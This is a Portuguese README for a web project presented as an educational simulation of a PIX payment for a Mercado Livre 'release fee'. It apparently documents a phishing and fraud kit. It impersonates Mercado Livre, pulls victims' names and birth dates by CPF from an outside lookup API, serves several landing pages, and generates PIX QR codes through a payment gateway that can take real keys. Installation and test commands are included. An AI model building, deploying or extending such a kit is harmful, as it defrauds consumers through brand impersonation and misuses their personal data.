# Sistema de Pagamento PIX - Mercado Livre (Simulação)

🎯 Sistema completo de simulação de pagamento PIX para taxa de liberação Mercado Livre com geração de códigos únicos por transação.

![Status](https://img.shields.io/badge/status-funcional-brightgreen)
![Python](https://img.shields.io/badge/python-3.8+-blue)
![License](https://img.shields.io/badge/license-MIT-green)

## ✨ Características

- ✅ **Códigos PIX únicos** - Cada clique gera uma transação completamente nova
- ✅ **Integração CPF API** - Busca automática de dados do CPF
- ✅ **Modal PIX centralizado** - Interface moderna e responsiva
- ✅ **QR Code dinâmico** - Gerado em tempo real
- ✅ **Fallback inteligente** - Funciona mesmo sem API externa
- ✅ **Layout mobile-first** - Otimizado para dispositivos móveis

## 🚀 Demonstração

Cada clique em "Pagar com PIX" gera um código único:

```
Transação #1: 25a20e48... → QR: ix011425a20e48c88d17...
Transação #2: 9cd9fe92... → QR: ix01149cd9fe92779217...
Transação #3: 54e34bb6... → QR: ix011454e34bb6184717...
```

## 📋 Pré-requisitos

- Python 3.8+
- pip (gerenciador de pacotes Python)

## 🔧 Instalação

1. Clone o repositório:
```bash
git clone https://github.com/Cosmiclox/mp-pix-payment.git
cd mp-pix-payment
```

2. Instale as dependências:
```bash
pip install -r requirements.txt
```

3. Inicie o servidor:
```bash
python3 server.py
```

4. Acesse no navegador:
```
http://127.0.0.1:8099/confirmar.php
```

## 📱 Fluxo de Uso

1. **index.html** → Usuário insere CPF
2. **processar_cpf.php** → Busca dados na API
3. **confirmar.php** → Mostra dados para confirmação
4. **resumo_pagamento.php** → Página de pagamento
5. **Modal PIX** → Clique em "Pagar com PIX"
6. **QR Code Único** → Cada clique gera novo código

## 🔑 Geração de Códigos Únicos

O sistema usa um algoritmo que garante unicidade:

```python
import uuid
import time

# UUID único + Timestamp
transaction_id = str(uuid.uuid4()).replace('-', '')[:32]
timestamp = str(int(time.time()))
unique_code = transaction_id[:12] + timestamp
```

## 🌐 APIs Integradas

### CPF Lookup
- **Endpoint**: `https://suapendencia.org/atencao1/api.php`
- **Status**: ✅ Funcionando
- **Retorna**: Nome, CPF, Data de Nascimento

### AnubisPay PIX
- **Endpoint**: `https://anubispay-e6cvb0febdfad9df.brazilsouth-01.azurewebsites.net`
- **Status**: ⚠️ Fallback ativo (HTTP 401)
- **Solução**: Códigos simulados únicos

## 📁 Estrutura do Projeto

```
mp-pix-payment/
├── server.py                    # Servidor HTTP com integração APIs
├── index.html                   # Página inicial
├── index2.html                  # Landing page alternativa
├── index3.html                  # Landing page 2
├── confirmar.php                # Confirmação de dados
├── resumo_pagamento.php         # Página de pagamento + Modal
├── processar_pagamento.php      # Endpoint de geração de PIX
├── processar_cpf.php            # Endpoint de busca CPF
├── pix.php                      # Redirector
├── anubispay_config.php         # Configuração AnubisPay
├── webhook.php                  # Webhook receiver
├── pagamento_sucesso.php        # Página de sucesso
├── README_SISTEMA.md            # Documentação técnica completa
└── requirements.txt             # Dependências Python
```

## 🎨 Interface

### Modal PIX
- Modal centralizado com `display: flex`
- QR Code gerado com biblioteca QRCode.js
- Timer de expiração "Expira em 10:00"
- Botão copiar código PIX
- Design responsivo mobile-first

## 🧪 Testes

### Testar geração de códigos únicos:

```bash
# Primeira transação
curl -X POST "http://127.0.0.1:8099/processar_pagamento.php" \
  -d "cpf=07311752639&nome=TESTE1&email=t1@test.com&telefone=11999999999"

# Segunda transação (código será diferente)
curl -X POST "http://127.0.0.1:8099/processar_pagamento.php" \
  -d "cpf=07311752639&nome=TESTE2&email=t2@test.com&telefone=11999999999"
```

## 🔐 Configuração AnubisPay (Opcional)

Para usar a API real do AnubisPay, configure as credenciais corretas em `server.py`:

```python
public_key = "sua_chave_publica"
secret_key = "sua_chave_secreta"
```

**Nota**: O sistema funciona perfeitamente com o fallback de códigos simulados únicos.

## 🐛 Troubleshooting

### Modal não abre
- Verifique o console do navegador
- Recarregue a página para carregar QRCode.js

### QR Code não aparece
- Sistema usa múltiplos CDNs de fallback
- Verifique conexão com internet

### Mesmo código PIX repetido
- ✅ Problema RESOLVIDO na versão atual
- Cada clique gera código único garantido

## 📝 Próximos Passos

- [ ] Implementar verificação de pagamento (polling)
- [ ] Adicionar persistência em banco de dados
- [ ] Criar sistema de webhook funcional
- [ ] Adicionar autenticação de usuário
- [ ] Implementar rate limiting
- [ ] Migrar para HTTPS

## 🤝 Contribuindo

Contribuições são bem-vindas! Sinta-se à vontade para:

1. Fazer fork do projeto
2. Criar uma branch para sua feature (`git checkout -b feature/AmazingFeature`)
3. Commit suas mudanças (`git commit -m 'Add some AmazingFeature'`)
4. Push para a branch (`git push origin feature/AmazingFeature`)
5. Abrir um Pull Request

## 📄 Licença

Este projeto é licenciado sob a Licença MIT - veja o arquivo [LICENSE](LICENSE) para detalhes.

## ⚠️ Aviso Legal

Este é um projeto de **simulação educacional**. Não utilize em produção sem as devidas adaptações de segurança, validações e conformidade legal.

## 📧 Contato

Projeto desenvolvido para fins educacionais e de demonstração.

---

**⭐ Se este projeto foi útil, considere dar uma estrela!**

## 🎉 Status do Projeto

✅ **Sistema 100% Operacional**

Cada clique em "Pagar com PIX" gera uma transação completamente nova com Transaction ID único e QR Code único!
